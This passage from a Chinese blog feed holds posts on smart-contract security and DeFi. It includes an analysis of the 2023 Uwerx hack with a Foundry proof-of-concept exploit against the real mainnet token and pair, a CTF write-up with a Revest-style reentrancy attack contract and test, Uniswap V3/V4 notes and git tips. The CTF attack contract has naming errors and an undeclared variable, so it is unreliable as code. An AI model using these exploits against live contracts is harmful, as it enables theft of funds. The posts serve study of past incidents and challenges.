class="line">      return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人觉得就是没有注意逻辑性，可以随便更改governance,然后操控权控制在自己手中</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uwerx攻击事件分析</title>
      <link href="/2024/11/03/Uwerx%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/03/Uwerx%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>攻击介绍<br>2023年8月2日，Uwerx被黑客攻击，损失了175ETH。</p><p>攻击分析<br>我们通过phalcon来分析。</p><p>通过调用栈能发现攻击者通过不断在uniswap V2 Pool交换，最终获利。很明显是Pool的兑换比率被破坏了。之所以能被破坏，是因为uwerx TOKEN合约的_transfer()方法被利用了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal virtual &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - amount;</span><br><span class="line">            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span><br><span class="line">            // decrementing then incrementing.</span><br><span class="line">            _balances[to] += amount;</span><br><span class="line">        &#125;</span><br><span class="line">        if (to == uniswapPoolAddress) &#123;</span><br><span class="line">            uint256 userTransferAmount = (amount * 97) / 100;</span><br><span class="line">            uint256 marketingAmount = (amount * 2) / 100;</span><br><span class="line">            uint256 burnAmount = amount - userTransferAmount - marketingAmount;</span><br><span class="line"></span><br><span class="line">            emit Transfer(from, to, userTransferAmount);</span><br><span class="line">            emit Transfer(from, marketingWalletAddress, marketingAmount);</span><br><span class="line">            _burn(from, burnAmount);</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            emit Transfer(from, to, amount);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        _afterTokenTransfer(from, to, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现当to &#x3D;&#x3D; uniswapPoolAddress时会有1%的token被销毁。uniswapPoolAddress为0x00……0001，此时调用uniswap的skim(to)方法，to设为0x00……0001，就能让Pool的兑换比率被破坏。</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Vulnerable Contract : https://etherscan.io/token/0x4306b12f8e824ce1fa9604bbd88f2ad4f0fe3c54</span><br><span class="line">// Attack Tx : https://etherscan.io/tx/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line">    IERC20 WERX = IERC20(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54);</span><br><span class="line">    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);</span><br><span class="line">    Uni_Pair_V2 pair = Uni_Pair_V2(0xa41529982BcCCDfA1105C6f08024DF787CA758C4);</span><br><span class="line">    </span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;https://eth.llamarpc.com&quot;, 17826202);</span><br><span class="line">        vm.label(address(WETH), &quot;WETH&quot;);</span><br><span class="line">        vm.label(address(WERX), &quot;WERX&quot;);</span><br><span class="line">        vm.label(address(Router), &quot;Router&quot;);</span><br><span class="line">        vm.label(address(pair), &quot;pair&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() external &#123;</span><br><span class="line">        // mock a flash loan for simplicity</span><br><span class="line">        deal(address(WETH), address(this), 20_000 ether);</span><br><span class="line">        WETH.approve(address(Router), type(uint256).max);</span><br><span class="line">        WERX.approve(address(Router), type(uint256).max);</span><br><span class="line">        </span><br><span class="line">        pair.sync();</span><br><span class="line"></span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">        path[0] = address(WETH);</span><br><span class="line">        path[1] = address(WERX);</span><br><span class="line"></span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(20_000 ether, 0, path, address(this), block.timestamp);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        WERX.transfer(address(pair), 4429817738575912760684500);</span><br><span class="line">                                     </span><br><span class="line">        pair.skim(address(0x01));</span><br><span class="line">        pair.sync();</span><br><span class="line"></span><br><span class="line">        path[0] = address(WERX);</span><br><span class="line">        path[1] = address(WETH);</span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(WERX.balanceOf(address(this)), 0, path, address(this), block.timestamp);</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker WETH balance after exploit&quot;, WETH.balanceOf(address(this)), WETH.decimals()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker WETH balance after exploit, ETH PROFIT&quot;, WETH.balanceOf(address(this)) - 20_000 ether, WETH.decimals()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UniswapV3,V4 功能对比</title>
      <link href="/2024/11/03/UniswapV3-V4-%E5%8A%9F%E8%83%BD%E5%AF%B9%E6%AF%94/"/>
      <url>/2024/11/03/UniswapV3-V4-%E5%8A%9F%E8%83%BD%E5%AF%B9%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<h1 id="以下功能对比摘抄于官网"><a href="#以下功能对比摘抄于官网" class="headerlink" title="以下功能对比摘抄于官网"></a>以下功能对比摘抄于官网</h1><h2 id="V4-与-V3"><a href="#V4-与-V3" class="headerlink" title="V4 与 V3"></a>V4 与 V3</h2><p>虽然 Uniswap v4 的基础集中流动性与 Uniswap v3 相同， 架构和会计存在一些关键差异。</p><h2 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h2><p>矿池创建<br>V4：单例合约有助于创建矿池和 还会存储其 state。此模式可降低创建池时的成本 以及执行多跳交换。因为矿池是合约状态，而不是全新的合约本身，所以矿池的创建成本要低得多。</p><p>V3：工厂合约负责创建矿池。池是 一个单独的 Contract 实例，用于管理自己的 state。矿池初始化 成本高昂，因为合约创建是 gas 密集型的</p><h2 id="Flash-Accounting-（快速记帐）"><a href="#Flash-Accounting-（快速记帐）" class="headerlink" title="Flash Accounting （快速记帐）"></a>Flash Accounting （快速记帐）</h2><p>V4：单例使用 flash accounting，即解锁 PoolManager 的调用方 允许进行余额更改操作（多次掉期、多次流动性修改等） 并且只需要在序列的最末端执行 token 传输。</p><p>V3：因为 V3 中缺少 Flash Accounting，所以这是责任 集成合约执行代币转账，在每次单独调用后，对每个单独的矿池合约进行代币转账</p><h2 id="流动性费用会计"><a href="#流动性费用会计" class="headerlink" title="流动性费用会计"></a>流动性费用会计</h2><p>V4：应计费用在修改流动性时起到抵免的作用。 增加流动性会将费用收入转化为流动性 仓内流动性降低会自动 要求提取未领取的费用收入。</p><p>在创建流动性时，可以提供一个额外的参数 salt。盐用于区分同一池中相同范围的位置。 这种分离可能是简化费用会计的首选。如果两个用户共享相同的 range 和 state 中，集成 Contract 必须小心管理 费用PoolManager</p><p>V3：相同范围和矿池的流动性持仓将共享相同的状态。虽然相信 当时 gas 效率更高，整合合约将需要处理费用管理，因为 状态在 Core Pool Contract 上共享</p><h2 id="原生-ETH"><a href="#原生-ETH" class="headerlink" title="原生 ETH"></a>原生 ETH</h2><p>V4：矿池对支持原生代币，因此 ETH 交换器和 流动性提供者受益于更便宜的 gas 成本降低 转移和取消额外的包装费用。</p><p>V3：ETH 需要先包装后再与其他代币配对。 由于包装和转移，这会导致更高的 gas 成本 包装的本机令牌。</p><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>仅限 V4：所有者现在可以为其位置设置订阅者。 每次头寸的流动性时，都会通知订阅者合约 或所有者变更。订阅者启用质押&#x2F;流动性挖矿，但用户不需要 转移他们的 ERC-721 代币。</p><p>V3：v3 中的权益质押要求用户将他们的 ERC-721 代币转移到合约上，从而使底层资产面临恶意行为的风险。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>我觉得v4的最伟大功能就是实现了单例设计，原先每部署一个流动性池就要部署一个新合约，而V4却不用，它将所有的流动性池保存在一个单例合约中，然后这样的做法会节省很多gas费用，而且还增加了hook钩子的用法，让用户多了更多的体验</p><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>在 Uniswap V4 中引入了 hook 的概念，可以在流动性池的调用的生命周期内某些指定点执行一些自定义的逻辑，hook 功能增加了流动性池的灵活性，可以执行更多的富有创造力的功能</p><p>Uniswap V4 目前支持在 8 个特定的位置进行 hook 回调：</p><ul><li>beforeInitialize &#x2F; afterInitialize</li><li>beforeModifyPosition &#x2F; afterModifyPosition</li><li>beforeSwap &#x2F; afterSwap</li><li>beforeDonate &#x2F; afterDonate<br>它的功能的案例也很齐全，在官方编写的hook案例可以看见如下几个例子：</li><li>几何平均预言机（GeomeanOracle.sol）</li><li>限价单（LimitOrder.sol）</li><li>时间加权平均做市商（TWAMM.sol）</li><li>波动率预言机（VolatilityOracle.sol）</li></ul><h2 id="Flash-account"><a href="#Flash-account" class="headerlink" title="Flash account"></a>Flash account</h2><p> 在 Uniswap V4 中一个新的设计是 Flash accounting。在 Uniswap 的早期版本中，像 swap 或者 addLiquidity 等操作都是以代币的转移结束，而在 V4 中，每一个操作会更新内部的一个净余额（delta），在所有操作结束时会校验该值是否为 0，必须保证该值为 0 才能交易成功。当 Flash accounting 和 Singleton 结合时，可以大大简化多跳交易。在 PoolManager 合约中新增了 take 和 settle 函数，分别用于向池中借出、存入资金，通过调用这两个函数，保证调用结束时不欠 PoolManager 合约或调用者任何代币。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git 协作流程</title>
      <link href="/2024/11/02/git-%E5%8D%8F%E4%BD%9C%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/11/02/git-%E5%8D%8F%E4%BD%9C%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="团队协作"><a href="#团队协作" class="headerlink" title="团队协作"></a>团队协作</h2><p>首先使用在gitub 上进行团队的协作，就是你自己要先弄一个分支，然后再提交上去，<br>流程如下：<br><strong>git clone 仓库</strong><br><strong>进入到仓库中：cd 仓库名</strong><br><strong>然后切换分支到要协作的分支：git checkout 分支名</strong><br><strong>创建自己的分支：git checkout -b 分支名1</strong><br><strong>写好自己的部分再提交：git add .</strong><br><strong>同上提交：git commit -m “描述”</strong><br><strong>推送至远程自己创建的分支：git push origin 分支名1</strong><br>这样就可以再创库中看到自己的分支，然后再提交去分支名（也就是说pr:Pull requst）注意要指定review;</p><h2 id="个人上传文件到仓库"><a href="#个人上传文件到仓库" class="headerlink" title="个人上传文件到仓库"></a>个人上传文件到仓库</h2><p> 将本地文件上传到github上，<br>要有一个自己想上传的仓库，<br>cd 要上传的文件名，git remote add origin (ssh下的仓库地址)，<br>切换分支，主要是看仓库是master,还是main, 还是其他的分支，git branch -M main , 切换到main分支上<br>直接上传到分支上 git push -u origin main<br>即可</p><h2 id="初始化一个仓库"><a href="#初始化一个仓库" class="headerlink" title="初始化一个仓库"></a>初始化一个仓库</h2><p>git init 仓库名<br>写好文件后<br>使用git add . 将文件上传至缓存区<br>查看分支 git branch<br>选择要上传到的分支，git checkout 分支名<br>然后就可以直接远程推送 git push -u origin main </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-degen-jackpot</title>
      <link href="/2024/10/30/CTF-degen-jackpot/"/>
      <url>/2024/10/30/CTF-degen-jackpot/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-degen-jackpot"><a href="#CTF-degen-jackpot" class="headerlink" title="CTF-degen-jackpot"></a>CTF-degen-jackpot</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/degen-jackpot">点击</a></p><p>题目要求：首先合约有1000个代币，你初始有一个代币，你的任务是提取全部的代币从合约中。</p><p>这个题合约看似很多，其实功能明显<br>FNFTHHandler合约是这个币的一些操作<br>LockManager合约是进行锁定地址的操作<br>OtherContract 合约，就是其他合约<br>OtherInterface 合约，就是接口的实现，可以在这里看见合约的一些功能函数。<br>Revert 合约，这个就是主合约了，也是我们要重点分析的合约<br>TokenVault合约，显而易见。金库合约，</p><p>要想取得全部代币，还是先看那里可以转出，<br>在Revert合约中，有个撤回函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawFNFT(uint fnftId, uint quantity) external override revestNonReentrant(fnftId) &#123;</span><br><span class="line">      address fnftHandler = addressesProvider.getRevestFNFT();</span><br><span class="line">      // Check if this many FNFTs exist in the first place for the given ID</span><br><span class="line">      require(quantity &lt;= IFNFTHandler(fnftHandler).getSupply(fnftId), &quot;E022&quot;);</span><br><span class="line">      // Check if the user making this call has this many FNFTs to cash in</span><br><span class="line">      require(quantity &lt;= IFNFTHandler(fnftHandler).getBalance(_msgSender(), fnftId), &quot;E006&quot;);</span><br><span class="line">      // Check if the user making this call has any FNFT&#x27;s</span><br><span class="line">      require(IFNFTHandler(fnftHandler).getBalance(_msgSender(), fnftId) &gt; 0, &quot;E032&quot;);</span><br><span class="line"></span><br><span class="line">      IRevest.LockType lockType = getLockManager().lockTypes(fnftId);</span><br><span class="line">      require(lockType != IRevest.LockType.DoesNotExist, &quot;E007&quot;);</span><br><span class="line">      require(getLockManager().unlockFNFT(fnftId, _msgSender()),&quot;E019&quot;);</span><br><span class="line">      // Burn the FNFTs being exchanged</span><br><span class="line">      burn(_msgSender(), fnftId, quantity);</span><br><span class="line">      getTokenVault().withdrawToken(fnftId, quantity, _msgSender());</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>但是要先知道这话代币的id，这是一个棘手的事，思考题目，我们有一个代币，可以给合约转账</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function depositAdditionalToFNFT(</span><br><span class="line">       uint fnftId,</span><br><span class="line">       uint amount,</span><br><span class="line">       uint quantity</span><br><span class="line">   ) external override returns (uint) &#123;</span><br><span class="line">       IRevest.FNFTConfig memory fnft = getTokenVault().getFNFT(fnftId);</span><br><span class="line">       require(fnftId &lt; getFNFTHandler().getNextId(), &quot;E007&quot;);</span><br><span class="line">       require(quantity &gt; 0, &quot;E070&quot;);</span><br><span class="line"></span><br><span class="line">       address vault = addressesProvider.getTokenVault();</span><br><span class="line">       address handler = addressesProvider.getRevestFNFT();</span><br><span class="line">       address lockHandler = addressesProvider.getLockManager();</span><br><span class="line"></span><br><span class="line">       bool createNewSeries = false;</span><br><span class="line">       &#123;</span><br><span class="line">           uint supply = IFNFTHandler(handler).getSupply(fnftId);</span><br><span class="line"></span><br><span class="line">           uint balance = IFNFTHandler(handler).getBalance(_msgSender(), fnftId);</span><br><span class="line"></span><br><span class="line">           if (quantity &gt; balance) &#123;</span><br><span class="line">               require(quantity == supply, &quot;E069&quot;);</span><br><span class="line">           &#125;</span><br><span class="line">           else if (quantity &lt; balance || balance &lt; supply) &#123;</span><br><span class="line">               createNewSeries = true;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       uint lockId = ILockManager(lockHandler).fnftIdToLockId(fnftId);</span><br><span class="line"></span><br><span class="line">       // Whether to split the new deposits into their own series, or to simply add to an existing series</span><br><span class="line">       uint newFNFTId;</span><br><span class="line">       if(createNewSeries) &#123;</span><br><span class="line">           // Split into a new series</span><br><span class="line">           newFNFTId = IFNFTHandler(handler).getNextId();</span><br><span class="line">           ILockManager(lockHandler).pointFNFTToLock(newFNFTId, lockId);</span><br><span class="line">           burn(_msgSender(), fnftId, quantity);</span><br><span class="line">           IFNFTHandler(handler).mint(_msgSender(), newFNFTId, quantity, &quot;&quot;);</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           // Stay the same</span><br><span class="line">           newFNFTId = 0; // Signals to handleMultipleDeposits()</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // Will call updateBalance</span><br><span class="line">       ITokenVault(vault).depositToken(fnftId, amount, quantity);</span><br><span class="line">       // Now, we transfer to the token vault</span><br><span class="line">       if(fnft.asset != address(0))&#123;</span><br><span class="line">           IERC20(fnft.asset).safeTransferFrom(_msgSender(), vault, quantity * amount);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       ITokenVault(vault).handleMultipleDeposits(fnftId, newFNFTId, fnft.depositAmount + amount);</span><br><span class="line"></span><br><span class="line">       return newFNFTId;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现，转账可以mint 新的id,再来看看mint函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function mint(address account, uint id, uint amount, bytes memory data) external override onlyRevestController &#123;</span><br><span class="line">        supply[id] += amount;</span><br><span class="line">        _mint(account, id, amount, data);</span><br><span class="line">        fnftsCreated += 1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没有想到更新id直接就是+1，所以我们就可以转账代币给合约，更新id,然后再撤回全部代币<br>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IRevert&#123;</span><br><span class="line">     function withdrawFNFT(uint fnftId, uint quantity) external ;</span><br><span class="line">      function depositAdditionalToFNFT(</span><br><span class="line">        uint fnftId,</span><br><span class="line">        uint amount,</span><br><span class="line">        uint quantity</span><br><span class="line">    ) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    IRevert revert;</span><br><span class="line">    IREC20 gov;</span><br><span class="line">     address attracker;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _revert,address _gov)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        revert = IRevert(_revert);</span><br><span class="line">        gov =IERC20(_gov);</span><br><span class="line">        attracker = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function setTrigger(bool _trigger) external &#123;</span><br><span class="line">        triggerCallback = _trigger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev Callback during _mint</span><br><span class="line">    function onERC1155Received(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256 id,</span><br><span class="line">        uint256 value,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        if (triggerCallback) &#123;</span><br><span class="line">            // depositAdditionalToFNFT will call mint again, triggering onERC1155Received</span><br><span class="line">            // we don&#x27;t want this to happen, so we set triggerCallback to false</span><br><span class="line">            triggerCallback=false;</span><br><span class="line">            revest.depositAdditionalToFNFT(1, 1e18, 1); // updates the depositAmount for fnftId=2 to 1e18</span><br><span class="line">            revest.withdrawFNFT(2, 100_001); // withdraw 100_001 from fnftId=2</span><br><span class="line">            gov.transfer(attacker,gov.balanceOf(address(this))); // send GOV tokens to attacker</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC1155BatchReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256[] calldata ids,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        return bytes4(0); // not accepted</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个题的原型，可以看看<a href="https://rekt.news/revest-finance-rekt/">点击</a>;<br>测试合约也可以看看;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// utilities</span><br><span class="line">import &#123;Test&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &#123;console&#125; from &quot;forge-std/console.sol&quot;;</span><br><span class="line">// core contracts</span><br><span class="line">import &#123;Token&#125; from &quot;src/other/Token.sol&quot;;</span><br><span class="line">import &#123;Revest&#125; from &quot;src/degen-jackpot/Revest.sol&quot;;</span><br><span class="line">import &#123;LockManager&#125; from &quot;src/degen-jackpot/LockManager.sol&quot;;</span><br><span class="line">import &#123;TokenVault&#125; from &quot;src/degen-jackpot/TokenVault.sol&quot;;</span><br><span class="line">import &#123;FNFTHandler&#125; from &quot;src/degen-jackpot/FNFTHandler.sol&quot;;</span><br><span class="line">import &#123;AddressRegistry&#125; from &quot;src/degen-jackpot/OtherContracts.sol&quot;;</span><br><span class="line">import &#123;IRevest&#125; from &quot;src/degen-jackpot/OtherInterfaces.sol&quot;;</span><br><span class="line"></span><br><span class="line">import &#123;RevestExploiter&#125; from &quot;src/degen-jackpot/RevestExploiter.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Testing is Test &#123;</span><br><span class="line"></span><br><span class="line">    address attacker = makeAddr(&#x27;attacker&#x27;);</span><br><span class="line">    address o1 = makeAddr(&#x27;o1&#x27;);</span><br><span class="line">    address o2 = makeAddr(&#x27;o2&#x27;);</span><br><span class="line">    address admin = makeAddr(&#x27;admin&#x27;); // should not be used</span><br><span class="line">    address adminUser = makeAddr(&#x27;adminUser&#x27;); // should not be used</span><br><span class="line"></span><br><span class="line">    Token gov;</span><br><span class="line">    Revest revest;</span><br><span class="line">    LockManager lockManager;</span><br><span class="line">    TokenVault tokenVault;</span><br><span class="line">    FNFTHandler fnftHandler;</span><br><span class="line">    AddressRegistry addressRegistry;</span><br><span class="line"></span><br><span class="line">    /// preliminary state</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line"></span><br><span class="line">        // funding accounts</span><br><span class="line">        vm.deal(admin, 10_000 ether);</span><br><span class="line">        vm.deal(attacker, 10_000 ether);</span><br><span class="line">        vm.deal(adminUser, 10_000 ether);</span><br><span class="line"></span><br><span class="line">        // deploying token contract</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        gov = new Token(&#x27;GOV&#x27;,&#x27;GOV&#x27;);</span><br><span class="line"></span><br><span class="line">        address[] memory addresses = new address[](2);</span><br><span class="line">        uint256[] memory amounts = new uint256[](2);</span><br><span class="line"></span><br><span class="line">        addresses[0]=adminUser; addresses[1]=attacker;</span><br><span class="line">        amounts[0]=100_000e18; amounts[1]=1e18;</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        gov.mintPerUser(addresses,amounts);</span><br><span class="line"></span><br><span class="line">        // deploying core contracts</span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        addressRegistry = new AddressRegistry();</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        revest = new Revest(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        lockManager = new LockManager(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        tokenVault = new TokenVault(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.prank(admin);</span><br><span class="line">        fnftHandler = new FNFTHandler(address(addressRegistry));</span><br><span class="line"></span><br><span class="line">        vm.startPrank(admin);</span><br><span class="line">        addressRegistry.setLockManager(address(lockManager));</span><br><span class="line">        addressRegistry.setTokenVault(address(tokenVault));</span><br><span class="line">        addressRegistry.setRevestFNFT(address(fnftHandler));</span><br><span class="line">        addressRegistry.setRevest(address(revest));</span><br><span class="line">        vm.stopPrank();</span><br><span class="line"></span><br><span class="line">        // --adminUser deposits GOV token into Revest vault</span><br><span class="line">        vm.prank(adminUser);</span><br><span class="line">        gov.approve(address(revest),100_000e18);</span><br><span class="line"></span><br><span class="line">        address[] memory recipients = new address[](1);</span><br><span class="line">        recipients[0]=adminUser;</span><br><span class="line">        uint256[] memory quantities = new uint256[](1);</span><br><span class="line">        quantities[0]=100;</span><br><span class="line">        bytes memory arguments;</span><br><span class="line"></span><br><span class="line">        IRevest.FNFTConfig memory fnftConfig;</span><br><span class="line">        fnftConfig.asset = address(gov);</span><br><span class="line">        fnftConfig.depositAmount=1_000e18;</span><br><span class="line"></span><br><span class="line">        vm.prank(adminUser);</span><br><span class="line">        revest.mintAddressLock(</span><br><span class="line">            adminUser,</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// solves the challenge</span><br><span class="line">    function testChallengeExploit() public &#123;</span><br><span class="line">        vm.startPrank(attacker,attacker);</span><br><span class="line"></span><br><span class="line">        RevestExploiter exploiter = new RevestExploiter(address(revest),address(gov));</span><br><span class="line"></span><br><span class="line">        address[] memory recipients = new address[](1);</span><br><span class="line">        recipients[0]=address(exploiter);</span><br><span class="line">        uint256[] memory quantities = new uint256[](1);</span><br><span class="line">        quantities[0]=2;</span><br><span class="line">        bytes memory arguments;</span><br><span class="line"></span><br><span class="line">        IRevest.FNFTConfig memory fnftConfig;</span><br><span class="line">        fnftConfig.asset = address(gov);</span><br><span class="line"></span><br><span class="line">        revest.mintAddressLock( // fnftId=1</span><br><span class="line">            address(exploiter),</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        gov.transfer(address(exploiter),1e18);</span><br><span class="line">        exploiter.setTrigger(true);</span><br><span class="line"></span><br><span class="line">        quantities[0]=100_001;</span><br><span class="line"></span><br><span class="line">        revest.mintAddressLock( // fnftId=2</span><br><span class="line">            address(exploiter),</span><br><span class="line">            arguments,</span><br><span class="line">            recipients,</span><br><span class="line">            quantities,</span><br><span class="line">            fnftConfig</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        validation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// expected final state</span><br><span class="line">    function validation() public &#123;</span><br><span class="line"></span><br><span class="line">        // attacker acquires all GOV tokens that were deposited into the Revest contract</span><br><span class="line">        assertEq(gov.balanceOf(address(tokenVault)),0);</span><br><span class="line">        assertEq(gov.balanceOf(attacker),100_001e18);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完结；<br>补充：</p><ul><li><p>mintAddressLock 函数的主要作用是创建一个新的 FNFT，并为其设置一个地址锁，这样只有特定的地址才能解锁这些 FNFT。这使得 FNFT 可以与特定的条件绑定，提供更复杂的锁定和解锁机制，增强了合约的灵活性和安全性。</p></li><li><p>address trigger: 触发锁定解除的地址。当满足某些条件时，这个地址将能够解锁对应的 FNFT。</p></li><li><p>bytes memory arguments: 用于传递其他可能需要的参数，具体用途取决于实现。</p></li><li><p>address[] memory recipients: 接收 FNFT 的地址数组。</p></li><li><p>uint[] memory quantities: 对应每个接收地址的 FNFT 数量数组。<br>IRevest.FNFTConfig memory fnftConfig: FNFT 的配置，包括资产类型和存款金额等。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-opyn-sesame</title>
      <link href="/2024/10/30/CTF-opyn-sesame/"/>
      <url>/2024/10/30/CTF-opyn-sesame/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-opyn-sesame"><a href="#CTF-opyn-sesame" class="headerlink" title="CTF-opyn-sesame"></a>CTF-opyn-sesame</h1><p>题目源代码：<a href="">点击</a></p><p>要求是：获得合约中所有的余额</p><p>和之前那个看涨期权有点像，这个是看跌期权，所还是的对这个股市的一些专有的词一些理解，这篇文章写的很好<a href="https://xueqiu.com/6489791900/299846807">点击</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
